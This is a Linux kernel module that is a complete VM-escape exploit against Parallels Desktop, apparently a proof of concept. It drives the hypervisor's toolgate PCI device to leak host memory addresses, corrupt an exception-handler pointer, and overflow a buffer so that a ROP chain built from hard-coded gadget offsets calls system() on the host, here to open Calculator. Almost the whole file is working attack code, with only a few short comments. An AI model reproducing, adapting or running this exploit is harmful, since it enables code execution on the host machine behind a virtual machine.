#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/pci.h>

// binary specific offsets

// 49151 and 49160
// some func passed to CFRunLoopTimerCreate
#define TEXTLEAK_OFF 0xdb110
// QListData::shared_null
#define QTLEAK_OFF 0x52e908
// exception handler struct (used in catch_exception_raise)
#define EXCHANDLER_OFF 0xfb0a70
#define EXCHANDLER_OLDHANDLER_OFF 0x80
// qt_array_empty (referenced in QArrayData::allocate if size is 0)
#define EMPTYARR_OFF 0x52dcc0
// qt_signal_spy_callback_set (referenced in qt_register_signal_spy_callbacks)
#define QTCALLBACK_OFF 0x54df28
// gadgets in prl_vm_app
// pop rdi ; ret
#define POPRDI 0x89d04
// in Camellia_cbc_encrypt: lea rsp, [rcx+0x30] ; rep retn
#define PIVOT 0xa3d28c
// call system
#define CALLSYSTEM 0x7f1a4f

u16 baseport;
struct pci_dev* pcidev;

#define TG_PORT_STATUS 0
#define TG_PORT_SUBMIT 8

#define INLINE_SIZE(sz) (((sz)+7)&~7)

typedef struct _TG_PAGED_BUFFER {
    u64 Va;
    u32 ByteCount;
    u32 Writable:1;
    u32 Reserved:31;
    u64 Pages[0];
} TG_PAGED_BUFFER;
typedef struct _TG_PAGED_REQUEST {
    u32 Request;
    u32 Status;
    u32 RequestSize;
    u16 InlineByteCount;
    u16 BufferCount;
    u64 RequestPages[1];
    // inline bytes
    // TG_PAGED_BUFFER buffers[]
} TG_PAGED_REQUEST;

void outq(u64 val, u16 port) {
    if (val>>32)
        outl(val>>32, port+4);
    outl(val, port);
}

void wstrcpy(void* dstp, char* src) {
    u16* dst = dstp;
    while (*src)
        *dst++ = *src++;
    *dst = 0;
}

// assumes buffer addrs will be page aligned
u64 calc_size(u32 inln, u32 bufcount, u64 totbufsz) {
    u64 dsize, dpages;

    totbufsz = (totbufsz+0xfff)&~0xfff;
    dsize = sizeof(TG_PAGED_REQUEST)+INLINE_SIZE(inln);
    dsize += bufcount*sizeof(TG_PAGED_BUFFER);
    dsize += 8*(totbufsz>>12);

    dpages = 1;
    while (1) {
        u64 delta = 1+((dsize-1)>>12) - dpages;
        if (!delta)
            break;
        dpages += delta;
        dsize += delta*8;
    }
    return dsize;
}

void tg_submit(u64 phys, TG_PAGED_REQUEST* req, u32 sync) {
    outq(phys, baseport+TG_PORT_SUBMIT);
    if (sync)
        while (req->Status == -1)
            yield();
    //printk(KERN_INFO "status: 0x%x\n", req->Status);
}

// inbuf/outbuf should be kmalloc'd
void twobuf_req(u32 op, void* inbuf, u64 inlen, void* outbuf, u64 outlen, u32 sync) {
    u64 dsize = calc_size(0, 2, ((inlen+0xfff)&~0xfff)+((outlen+0xfff)&~0xfff));
    u64 dpages = (dsize+0xfff)>>12;
    TG_PAGED_REQUEST* req = kzalloc(dsize, GFP_KERNEL);
    TG_PAGED_BUFFER* buf = (void*)&req->RequestPages[dpages];
    u64 inphys = virt_to_phys(inbuf), outphys = virt_to_phys(outbuf), reqphys = virt_to_phys(req);
    u32 i;

    if (!req) {
        printk(KERN_WARNING "[x] couldnt alloc 0x%llx bytes for req\n", dsize);
        return;
    }

    req->Request = op;
    req->Status = -1;
    req->RequestSize = dsize;
    req->InlineByteCount = 0;
    req->BufferCount = 2;
    
    buf->Va = inphys;
    buf->ByteCount = inlen;
    buf->Writable = 1;
    for (i = 0; i < (buf->ByteCount+0xfff)>>12; i++)
        buf->Pages[i] = (inphys>>12)+i;
    buf = (void*)&buf->Pages[(buf->ByteCount+0xfff)>>12];
    buf->Va = outphys;
    buf->ByteCount = outlen;
    buf->Writable = 1;
    for (i = 0; i < (buf->ByteCount+0xfff)>>12; i++)
        buf->Pages[i] = (outphys>>12)+i;

    for (i = 0; i < dpages; i++)
        req->RequestPages[i] = (reqphys>>12)+i;

    tg_submit(reqphys, req, sync);
    kfree(req);
}

void dnd_req(void* inbuf, u64 inlen, void* outbuf, u64 outlen, u32 sync) {
    twobuf_req(0x8304, inbuf, inlen, outbuf, outlen, sync);
}

u64 init_worker(void) {
    u64 worker;
    void* buf = kzalloc(0x894, GFP_KERNEL);
    if (!buf) {
        printk(KERN_WARNING "[x] couldnt alloc buf in init_worker\n");
        return 0;
    }
    *(u32*)(buf+0) = 0x300;
    *(u32*)(buf+4) = 2;
    *(u32*)(buf+0x20) = 0;
    *(u32*)(buf+0x1c) = 0;

    dnd_req(buf, 0x894, buf, 0x894, 1);
    
    worker = *(u64*)(buf+0xc);
    //printk(KERN_INFO "worker: 0x%llx\n", worker);

    kfree(buf);
    return worker;
}

void set_fs_fields(u64 worker, u32 num_fs_entries, u64 fs_size) {
    void* buf = kzalloc(0x894, GFP_KERNEL);
    if (!buf) {
        printk(KERN_WARNING "[x] couldnt alloc buf in set_fs_fields\n");
        return;
    }
    *(u32*)(buf+0) = 0x106;
    *(u32*)(buf+4) = 2;
    *(u64*)(buf+0xc) = worker;
    *(u64*)(buf+0x1c) = fs_size;
    *(u32*)(buf+0x24) = num_fs_entries;

    dnd_req(buf, 0x894, buf, 0x894, 1);
    kfree(buf);
}

void delete_worker(u64 worker) {
    void* buf = kzalloc(0x894, GFP_KERNEL);
    if (!buf) {
        printk(KERN_WARNING "[x] couldnt alloc buf in delete_worker\n");
        return;
    }
    *(u32*)(buf+0) = 0x104;
    *(u32*)(buf+4) = 2;
    *(u64*)(buf+0xc) = worker;

    dnd_req(buf, 0x894, buf, 0x894, 1);
    kfree(buf);
}

void ptr_write(u64 worker, u64 ptr) {
    void* buf = kzalloc(0x894, GFP_KERNEL);
    if (!buf) {
        printk(KERN_WARNING "[x] couldnt alloc buf in ptr_write\n");
        return;
    }
    *(u32*)(buf+0) = 0x107;
    *(u32*)(buf+4) = 2;
    *(u64*)(buf+0xc) = worker;
    memset(buf+0x20, 0x41, 0x874-0xc);
    *(u64*)(buf+0x888) = ptr-0x60;

    dnd_req(buf, 0x894, buf, 0x894, 0);
    kfree(buf);
}

// out should be 0x70 bytes allocated
void uninit_leaks(void* out) {
    u32* hdr = kzalloc(0x20, GFP_KERNEL);
    void* buf = kzalloc(0x90, GFP_KERNEL);
    hdr[0] = 0x20;
    hdr[2] = 0x90;
    hdr[3] = 0x90;
    *(u32*)(buf+0) = 10;
    *(u32*)(buf+8) = 2;
    twobuf_req(0x8050, hdr, 0x20, buf, 0x90, 1);
    memcpy(out, buf+0x20, 0x70);
}

void megasmash(u64 text, u64 qtcore) {
    void* data;
    u32* hdr;
    u64 data_phys, hdr_phys;
    TG_PAGED_REQUEST* req;
    TG_PAGED_BUFFER* buf;
    u32 i, j;
    // 1st buffer pad up to page with func ptr
    // then 2nd buffer is full page with payload
    u64 pad_sz = (QTCALLBACK_OFF&~0xfff)-(EMPTYARR_OFF+0x18);
    u64 fptr_off = QTCALLBACK_OFF&0xfff;

    u64 dsize = calc_size(0, 7, 0x40000000ul*4+0x2000);
    u64 dpages = (dsize+0xfff)>>12;
    req = vmalloc(dsize);
    if (!req) {
        printk(KERN_WARNING "[x] couldnt alloc 0x%llx bytes for req\n", dsize);
        return;
    }

    hdr = kzalloc(0x20, GFP_KERNEL);
    if (!hdr) {
        printk(KERN_WARNING "[x] couldnt alloc hdr\n");
        return;
    }
    hdr[0] = 0x20;
    hdr[2] = 0xffffffff;
    hdr_phys = virt_to_phys(hdr);

    data = vmalloc(0x1000);
    if (!data) {
        printk(KERN_WARNING "[x] couldnt alloc data\n");
        return;
    }
    memset(data, 0x41, 0x1000);
    *(u64*)(data+fptr_off) = text+PIVOT;
    *(u64*)(data+fptr_off+0x30) = text+POPRDI;
    *(u64*)(data+fptr_off+0x38) = qtcore+QTCALLBACK_OFF+0x48;
    *(u64*)(data+fptr_off+0x40) = text+CALLSYSTEM;
    strcpy(data+fptr_off+0x48, "open -a Calculator");
    data_phys = pci_map_page(pcidev, vmalloc_to_page(data), 0, 0x1000, PCI_DMA_BIDIRECTIONAL);

    req->Request = 0x8050;
    req->Status = -1;
    req->InlineByteCount = 0;
    req->RequestSize = dsize;
    req->BufferCount = 7;

    // header
    buf = (void*)&req->RequestPages[dpages];
    buf->Va = hdr_phys;
    buf->ByteCount = 0x20;
    buf->Writable = 1;
    buf->Pages[0] = hdr_phys>>12;
    buf = (void*)&buf->Pages[(buf->ByteCount+0xfff)>>12];

    // pad up to page with callback
    buf->Va = data_phys;
    buf->ByteCount = pad_sz;
    buf->Writable = 1;
    for (i = 0; i < (buf->ByteCount+0xfff)>>12; i++)
        buf->Pages[i] = data_phys>>12;
    buf = (void*)&buf->Pages[(buf->ByteCount+0xfff)>>12];

    // payload for smash
    buf->Va = data_phys;
    buf->ByteCount = 0x1000;
    buf->Writable = 1;
    for (i = 0; i < (buf->ByteCount+0xfff)>>12; i++)
        buf->Pages[i] = data_phys>>12;
    buf = (void*)&buf->Pages[(buf->ByteCount+0xfff)>>12];

    // make total byte count 0xffffffff
    for (i = 0; i < 4; i++) {
        buf->Va = data_phys;
        buf->ByteCount = 0x40000000 - (i == 3 ? pad_sz+0x1001 : 0);
        buf->Writable = 1;
        for (j = 0; j < (buf->ByteCount+0xfff)>>12; j++)
            buf->Pages[j] = data_phys>>12;
        buf = (void*)&buf->Pages[(buf->ByteCount+0xfff)>>12];
    }

    for (i = 0; i < dpages; i++)
        req->RequestPages[i] = pci_map_page(pcidev, vmalloc_to_page((void*)req+i*0x1000), 0, 0x1000, PCI_DMA_BIDIRECTIONAL)>>12;

    printk(KERN_INFO "DSADSADSA\n");
    tg_submit(req->RequestPages[0]<<12, req, 1);
    printk(KERN_INFO "0x%x\n", req->Status);

    pci_unmap_page(pcidev, data_phys, 0x1000, PCI_DMA_BIDIRECTIONAL);
    for (i = 0; i < dpages; i++)
        pci_unmap_page(pcidev, req->RequestPages[i]<<12, 0x1000, PCI_DMA_BIDIRECTIONAL);
    vfree(req);
    vfree(data);
    kfree(hdr);
}

void exploit(void) {
#define NWORKERS 32
    u64 workers[NWORKERS];
    u64 worker;
    u64 leaks[0x70/8];
    u32 i;
    u64 text = 0, qtcore = 0;
    u32 mark1 = 0x11111111;
    u64 mark2 = 0x2222222233333333;

    while (!text) {
        uninit_leaks(&leaks);
        for (i = 0; i+8 < sizeof(leaks)/8; i++)
            if (leaks[i] == 0x4d5554584d555458 && (leaks[i+8]&0xfff) == (TEXTLEAK_OFF&0xfff)) {
                text = leaks[i+8]-TEXTLEAK_OFF;
                break;
            }
    }
    printk(KERN_INFO "TEXT: 0x%llx\n", text);

    while (!qtcore) {
        for (i = 0; i < NWORKERS; i++) {
            workers[i] = init_worker();
            set_fs_fields(workers[i], mark1, mark2);
        }
        for (i = 0; i < NWORKERS; i++)
            delete_worker(workers[i]);
        uninit_leaks(&leaks);
        for (i = 0; i+5 < sizeof(leaks)/8; i++)
            if ((u32)leaks[i] == mark1 && leaks[i+1] == mark2 && (leaks[i+5]&0xfff) == (QTLEAK_OFF&0xfff)) {
                qtcore = leaks[i+5]-QTLEAK_OFF;
                break;
            }
    }
    printk(KERN_INFO "QTCORE: 0x%llx\n", qtcore);

    // overwrite ptr used in exchandler with bad value (from misalignment)
    worker = init_worker();
    ptr_write(worker, text+EXCHANDLER_OFF+EXCHANDLER_OLDHANDLER_OFF+4);

    megasmash(text, qtcore);
}

int tg_probe(struct pci_dev* dev, const struct pci_device_id* id) {
    int ret;
    pcidev = dev;
    ret = pci_enable_device(dev);
    if (ret) {
        printk(KERN_WARNING "[x] failed to enable device: %d\n", ret);
        return ret;
    }
    printk(KERN_INFO "[+] device enabled\n");
    ret = pci_set_dma_mask(dev, DMA_BIT_MASK(64));
    if (ret) {
        printk(KERN_WARNING "[x] failed to set dma mask: %d\n", ret);
        return ret;
    }
    ret = pci_request_region(dev, 0, "prl_exp_portio");
    if (ret) {
        printk(KERN_WARNING "[x] failed to request portio region: %d\n", ret);
        return ret;
    }
    baseport = pci_resource_start(dev, 0);
    printk(KERN_INFO "baseport: 0x%hx\n", baseport);
    exploit();
    return 0;
}

void tg_remove(struct pci_dev* dev) {
    pci_release_region(dev, 0);
    pci_disable_device(dev);
}

static struct pci_device_id pci_ids[] = {
    {PCI_DEVICE(0x1ab8, 0x4000)},
    {0}
};
static struct pci_driver tg_driver = {
    .name = "prl_exploit_driver",
    .id_table = pci_ids,
    .probe = tg_probe,
    .remove = tg_remove
};

static int __init init_tg_module(void) {
    int ret;
    ret = pci_register_driver(&tg_driver);
    if (ret) {
        printk(KERN_WARNING "[x] failed to register driver: %d\n", ret);
        return ret;
    }
    return 0;
}
static void __exit exit_tg_module(void) {
    printk(KERN_INFO "[+] unregistering driver\n");
    pci_unregister_driver(&tg_driver);
}
module_init(init_tg_module);
module_exit(exit_tg_module)
